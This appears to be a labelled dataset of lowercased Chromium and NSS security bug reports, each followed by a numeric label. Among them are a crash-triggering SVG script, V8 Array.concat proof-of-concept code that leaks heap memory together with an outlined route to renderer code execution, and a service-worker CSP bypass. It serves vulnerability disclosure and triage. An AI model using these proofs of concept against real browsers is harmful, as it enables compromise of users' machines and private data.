third_party/webkit/source/core/dom/node.cpp:2036:5 47 in dispatchload third_party/webkit/source/core/html/htmlframeownerelement.cpp:218:5 48 in non-virtual thunk to blink htmlframeownerelement dispatchload third_party/webkit/source/core/html/htmlframeownerelement.cpp:216 49 in blink localdomwindow dispatchloadevent third_party/webkit/source/core/frame/localdomwindow.cpp:1374:9 50 in blink localdomwindow dispatchwindowloadevent third_party/webkit/source/core/frame/localdomwindow.cpp:404:5 51 in blink localdomwindow documentwasclosed third_party/webkit/source/core/frame/localdomwindow.cpp:409:5 52 in blink document implicitclose third_party/webkit/source/core/dom/document.cpp:2681:9 53 in blink frameloader checkcompleted third_party/webkit/source/core/loader/frameloader.cpp:577:9 54 in blink frameloader finishedparsing third_party/webkit/source/core/loader/frameloader.cpp:494:5 55 in blink document finishedparsing third_party/webkit/source/core/dom/document.cpp:4773:9 56 in blink htmltreebuilder finished third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:2814:5 57 in end third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:897:5 58 in attempttorundeferredscriptsandend third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:910 59 in blink htmldocumentparser preparetostopparsing third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:284 60 in blink htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr blink htmldocumentparser parsedchunk third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:533:13 61 in blink htmldocumentparser pumppendingspeculations third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:586:36 62 in operator third_party/webkit/source/wtf/functional.h:101:16 63 in callinternal 0 third_party/webkit/source/wtf/functional.h:176 64 in wtf partboundfunctionimpl std 1 tuple blink crossthreadweakpersistentthispointer blink htmlparserscheduler wtf functionwrapper void blink htmlparserscheduler operator third_party/webkit/source/wtf/functional.h:168 65 in blink cancellabletaskfactory cancellabletask run third_party/webkit/source/platform/scheduler/cancellabletaskfactory.cpp:27:9 66 in run base/bind_internal.h:158:12 67 in makeitso base/bind_internal.h:298 68 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal passedwrapper scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task void run base internal bindstatebase base/bind_internal.h:348 69 in run base/callback.h:394:12 70 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 71 in scheduler taskqueuemanager processtaskfromworkqueue scheduler internal workqueue scheduler internal taskqueueimpl task components/scheduler/base/task_queue_manager.cc:288:3 72 in scheduler taskqueuemanager dowork base timeticks bool components/scheduler/base/task_queue_manager.cc:200:13 73 in run base/bind_internal.h:179:12 74 in makeitso base/bind_internal.h:308 75 in base internal invoker base indexsequence 0ul 1ul 2ul base internal bindstate base internal runnableadapter void scheduler taskqueuemanager base timeticks bool void scheduler taskqueuemanager base timeticks bool base weakptr scheduler taskqueuemanager base timeticks bool base internal typelist base internal unwraptraits base weakptr scheduler taskqueuemanager base internal unwraptraits base timeticks base internal unwraptraits bool base internal invokehelper true void base internal runnableadapter void scheduler taskqueuemanager base timeticks bool base internal typelist base weakptr scheduler taskqueuemanager const base timeticks const bool const void run base internal bindstatebase base/bind_internal.h:348 76 in run base/callback.h:394:12 77 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 78 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:486:3 79 in deferorrunpendingtask base/message_loop/message_loop.cc:495:5 80 in base messageloop dowork base/message_loop/message_loop.cc:607 81 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:33:21 82 in base runloop run base/run_loop.cc:56:3 83 in base messageloop run base/message_loop/message_loop.cc:293:3 84 in content renderermain content mainfunctionparams const content/renderer/renderer_main.cc:226:7 85 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:304:14 86 in content runnamedprocesstypemain std 1 basic_string char std 1 char_traits char std 1 allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:391:12 87 in content contentmainrunnerimpl run content/app/content_main_runner.cc:752:12 88 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 89 in main content/shell/app/shell_main.cc:48:10 90 in libc_start_main build/glibc-ryfjv0/glibc-2.21/csu/libc-start.c:289 addresssanitizer can not provide additional info summary addresssanitizer segv third_party/webkit/source/core/dom/text.h:86:1 in totext 18266==aborting version chrome version current stable latest asan build operating system tested on linux and windows poc tested on windows 10 reproduction case crash.svg svg width 100 height 100 viewbox 0 0 100 100 xmlns xmlns xlink script type text/javascript cdata function start o try while document.removechild document.firstchild catch e o398=document.implementation.createhtmldocument document.appendchild o398.documentelement o433=document.createelementns o433.type='image o466=document.createelementns o466.srcdoc=unescape o466.addeventlistener load load false document.documentelement.appendchild o433 window.settimeout bar 40 function bar document.documentelement.appendchild o466 o433.setattribute src id37 function load o433.value location.reload start script svg for crashes please include the following additional information type of crash tab	7
heap-use-after-free in blink frameview performlayout detailed report fuzzer attekett_surku_fuzzer job type linux_asan_chrome_media platform id linux crash type heap-use-after-free read 8 crash address crash state blink frameview performlayout blink frameview layout blink frameview updatestyleandlayoutifneededrecursive recommended security severity medium unminimized testcase additional requirements requires gestures filer inferno see for more information	7
security v8 array.concat oob access writeup i vulnerability p.s the line numbers i mentioned below are referred to this version of v8 the vulnerability lies in function iterateelements src/builtin.cc:997 the function is to iteratively visit elements of an array let us take the visiting on an array containing fast/fast smi elements as an example from line 1025 in src/builtin.cc function iterateelements switch array getelementskind case fast_smi_elements case fast_elements case fast_holey_smi_elements case fast_holey_elements run through the elements fixedarray and use haselement and getelement to check the prototype for missing elements handle fixedarray elements fixedarray cast array elements int fast_length static_cast int length fast_length keeps its value after entering the iteration below dcheck fast_length elements length for int j 0 j fast_length j handlescope loop_scope isolate handle object element_value elements get j isolate get the element with index j leading to oob access if element_value isthehole visitor visit j element_value else if it is a hole it may go to its prototype for the value with index j maybe bool maybe jsreceiver haselement array j if maybe.isjust return false if maybe.fromjust call getelement on array not its prototype or getters wo n't have the correct receiver assign_return_on_exception_value isolate element_value object getelement isolate array j false here we redefine the function to get the value in array s proto with index j inside our redefinition function we make the length of the array shorter fast_length visitor visit j element_value break we can see that the for loop iterates for fast_length times which is determined before entering the loop however if we keep a hole inside the array at index j and define the function to get the value in the array s proto with index j we have a chance to shorten the array in the middle of the loop and force v8 to re-organize the v8 heap after that the loop keeps going on and elements get j may lead to an oob access note that in chrome release version elements get j has no bound checking as follows src/objects-inl.h:2362 object fixedarray get int index const slow_dcheck index 0 index this length release version does nothing here return read_field this kheadersize index kpointersize similarly the same issue also lies in another switch case visiting on an array containing fast double elements ii poc the function iterateelements is used in array.concat which can be called in javascript to trigger the vulnerability a simple poc demonstrates an oob access as follows html script language javascript function gc tmp for var i 0 i i tmp.push new uint8array 10 tmp null b new array 10 b 0 0.1 note that b 1 is a hole b 2 2.1 b 3 3.1 b 4 4.1 b 5 5.1 b 6 6.1 b 7 7.1 b 8 8.1 b 9 9.1 b 10 10.1 object.defineproperty b.__proto 1 define b.__proto 1 to gain the control in the middle of the loop get function b.length 1 shorten the array gc shrink the memory return 1 set function new_value some business logic goes here value new_value c b.concat for var i 0 i c.length i document.write c i document.write br script html my result it differs 0.1 1 3.60739284464e-313 2.121995791e-314 0 8.487983164e-314 2.121995791e-314 2.121995791e-314 2.121995791e-314 1.9338903543223e-311 2.610054822887e-312 we get the leaked information on the v8 heap which does not originally belong to that fast double elem array iii conclusion we can rely on this single vulnerability to achieve arbitrary code execution in the renderer process even on x64 the main idea is that 1 trigger the vulnerability on a fast double elem array and craft memory layout to make heap addresses lie just after the victim array elements these heap addresses will be oob accessed later as doubles and thus we got an info leak 2 trigger the vulnerability on a fast elem array and craft memory layout to make controlled addresses lie just after the victim array elements these crafted addresses will be oob accessed later and considered as v8 object addresses we can control the data content pointed by these crafted addresses and thus own some arraybuffer objects my choice fully under our control after that arbitrary read/write is easily achieved and the code execution is then straightforward refer to the exploit for details when an alert pops up attach the windbg onto the renderer process and continue the execution the process will trap into a break instruction int3 set by me environment chrome stable version 49.0.2623.87 64-bit windows 10 version 1511 10586.164 credit wen xu tencent keenlab hotdog3645 gmail.com	11
security rwhi uaf from bad fullscreen widget routing id when a fullscreen widget is created a webcontentsimpl stores its routing id in fullscreen_widget_routing_id wci assumes that this widget belongs to the process of the current main frame getrendermanager current_host getprocess which it normally does a compromised renderer can swap the process of the main frame while keeping the fullscreen widget alive normally the fullscreen widget would be deleted as the renderer navigates but there is an exception if the navigation was within the page then the fullscreen is kept alive this happens for example when only the url fragment changes in such case renderer sets framehostmsg_didcommitprovisionalload_params was_within_same_page true and the browser mostly trusts that even if the the navigation was n't within page and the process was swapped if the renderer swaps the process and sets was_within_same_page true the fullscreen_widget_routing_id will end up pointing to a wrong widget in the new process if the renderer now closes fullscreen this wrong widget is deleted it is deleted manually in renderwidgethostimpl destroy because fullscreen widgets are n't owned by a smart pointer normal widgets are owned by a scoped_ptr render_widget_host in renderviewhostimpl though if such a widget is manually deleted by an attacker the scoped_ptr in rvhi ends up holding a dangling pointer that can uaf version chrome version 48 stable and up operating system all reproduction case apply poc.patch and build i ve tested with a release build navigate to it should display something like ondidcommitprovisionalload rphid=14 ondidcommitprovisionalload rphid=15 ondidcommitprovisionalload rphid=14 ondidcommitprovisionalload rphid=15 trigger free delete rwh=000026c38f3a71c0 with owner_delegate trigger use use rwh=000026c38f3a71c0 segmentation fault	11
tracking bug for internal fixes chrome m49 release 2 high	11
heap-use-after-free in base subtle refcountedthreadsafebase release detailed report fuzzer meacer_extension_apis job type windows_asan_chrome crash type heap-use-after-free write 4 crash address crash state crash stack base subtle refcountedthreadsafebase release base internal bindstate base internal runnableadapter void free stack extensions pagecapturesaveasmhtmlfunction scalar base deletehelper uithreadextensionfunction dodelete regressed minimized testcase 7.74 kb filer inferno	11
tracking bug for internal fixes chrome m49 release 0 critical high medium low	7
assertion failed object object isbox detailed report fuzzer bj_broddelwerk job type linux_asan_chrome_mp platform id linux crash type assert crash address crash state assertion failed object object isbox blink layoutblockflow layoutblockchildren blink layoutblockflow layoutblockflow regressed minimized testcase 4.04 kb filer inferno see for more information	7
tracking bug for internal fixes chrome m49 release 0 critical high medium low	5
csp for evil service workers useragent mozilla/5.0 x11 cros x86_64 7390.48.0 applewebkit/537.36 khtml like gecko chrome/46.0.2490.52 safari/537.36 steps to reproduce the problem i think was n't fixed correctly please take a look this poc with service workers q=bar and q=baz should work because they create a redirect which means that only the origin part of the csp should apply however as you can see the full policy is applied this means that by using service workers you can check whether the full path applies or not in other words all the attacks from homakov from last year should work today with a simple service worker that does onfetch=f e e.respondwith fetch e.request here s a better example using a similar poc from 2014 with sw without sw as you see the sw example triggers violation reports for places where the user is logged in but none for when the user is n't logged in what is the expected behavior service workers should check 1 response.url request.url 2 if the same then let the default csp apply 3 if different then only validate the origins note that this still differs from the spec in that intermediate redirects wo n't be checked by csp but whatever what went wrong maybe we should give up with csp p did this work before n/a chrome version 46.0.2490.52 channel n/a os version 7390.48.0 flash version shockwave flash 19.0 r0	5
security dynamic code modification allows direct calls inside existing super instructions the bug is confirmed for x86-64 and i am pretty sure it affects x86-32 too dynamic code replacement only validates instructions that have changed and remembers the instruction boundaries for instructions that have not changed because unchanged instructions are not validated the internal instructions of super instructions are not marked as invalid jump targets this means that a modified direct call can target any unmodified instruction which in turn allows a jump to any address this is a nacl sandbox escape a simple non-executable example of an unsafe chunk of code that can be injected with dynamic code modification	9
nss_nodb_init should not try to open pkcs11.txt and secmod.db although nss_nodb_init takes a configdir argument it ignores the argument a coworker of mine ran strace on a simple program that calls nss_nodb_init null strace showed that nss_nodb_init tries to open pkcs11.txt and secmod.db nss_nodb_init should not try to open pkcs11.txt and secmod.db because those are not the intended file paths	7